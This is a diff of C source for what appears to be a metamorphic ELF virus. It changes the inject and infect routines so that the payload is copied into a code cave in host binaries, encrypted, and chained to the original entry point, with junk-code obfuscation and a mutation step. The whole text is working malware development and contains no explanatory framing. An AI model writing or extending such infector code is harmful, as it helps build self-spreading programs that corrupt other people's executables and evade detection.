@@ -75,7 +75,7 @@ static void update_signature(data_t *data) {
 
 static int	inject(data_t *data) {
 
-	if (bss(data, data->cave.p_size) != 0) {
+	if (bss(data, data->cave.v_size) != 0) {
 		return 1;
 	} JUNK;
 
@@ -84,22 +84,27 @@ static int	inject(data_t *data) {
 
 	uint16_t jmp_offset		= (uintptr_t)&jmp_end - (uintptr_t)&_start + 1;
 	uintptr_t start			= (uintptr_t)&_start;
+	uintptr_t real_start_ptr= (uintptr_t)&real_start;
 	uint16_t real_start_off = (uintptr_t)&real_start - (uintptr_t)&_start;
 
-	getrandom(g_key, KEY_SIZE, 0); JUNK;
+	//getrandom(g_key, KEY_SIZE, 0); JUNK;data
 
-	g_is_encrypted = true;
 
 	data->cave.rel_jmp = (int32_t)calc_jmp(data->cave.addr, data->cave.old_entry, jmp_offset + JMP_SIZE);
 
-	ft_memcpy(data->file + data->cave.offset, (void*)start, data->cave.p_size);
+	ft_memcpy(data->file + data->cave.offset + real_start_off, (void *)real_start_ptr, data->cave.p_size); JUNK;
+
+	//encrypt(data->file + data->cave.offset + real_start_off, PAYLOAD_SIZE, g_key);
+
+	crypt(data->file + data->cave.offset + real_start_off, g_payload_size);
+
+	g_is_encrypted = true;
+
+	ft_memcpy(data->file + data->cave.offset, (void *)start, real_start_off);
 
 	ft_memcpy(data->file + data->cave.offset + jmp_offset, &data->cave.rel_jmp, JMP_SIZE); JUNK;
 
-	encrypt(data->file + data->cave.offset + real_start_off, PAYLOAD_SIZE, g_key);
-
-	//data->algo_vars.data = data->file + data->cave.offset + real_start_off;
-	//data->algo_vars.size = PAYLOAD_SIZE;
+	//ft_memcpy(data->file + data->cave.offset + g_is_encrypted_off, &g_is_encrypted, sizeof(g_is_encrypted));
 
 	return 0;
 }
@@ -114,7 +119,8 @@ static int	infect(const char *filename, bootstrap_data_t *bs_data)
 
 	data.bs_data = bs_data;
 
-	data.cave.p_size = (uintptr_t)&real_end - (uintptr_t)&_start;
+	data.cave.v_size = (uintptr_t)&real_end - (uintptr_t)&_start;
+	data.cave.p_size = (uintptr_t)&real_end - (uintptr_t)&real_start;
 
 	if (map_file(filename, &data) != 0) {
 		return 1;
@@ -265,17 +271,12 @@ void	entrypoint(int argc, char **argv, char **envp)
 	if (pestilence() != 0) return ;
 #endif
 
-	/* saving these values (they will be overwritten by the packer) */
-	uint8_t key[KEY_SIZE];
-	ft_memcpy(key, g_key, KEY_SIZE);
+	int start_offset = g_start_offset;
+	bool is_encrypted = g_is_encrypted;
+	
+	crypt_params_t saved;
 
-	saved_vars_t saved = {
-		.start_offset = g_start_offset,
-		.is_encrypted = g_is_encrypted,
-		.key = {0}
-	};
-
-	ft_memcpy(saved.key, key, KEY_SIZE);
+	ft_memcpy(&saved, &g_params, sizeof(crypt_params_t));
 
 	prepare_mutate();
 
@@ -285,9 +286,9 @@ void	entrypoint(int argc, char **argv, char **envp)
 
 	famine(&bootstrap_data, &counter);
 
-	if (war(counter, &file, saved.start_offset) != 0) return ;
+	if (war(counter, &file, start_offset) != 0) return ;
 
-	death(&saved, &file);
+	death(&saved, start_offset, &file, is_encrypted);
 
 	//if (g_start_offset == ORIG_TEXT_OFF) {
 	//	unlink(bootstrap_data.argv[0]);
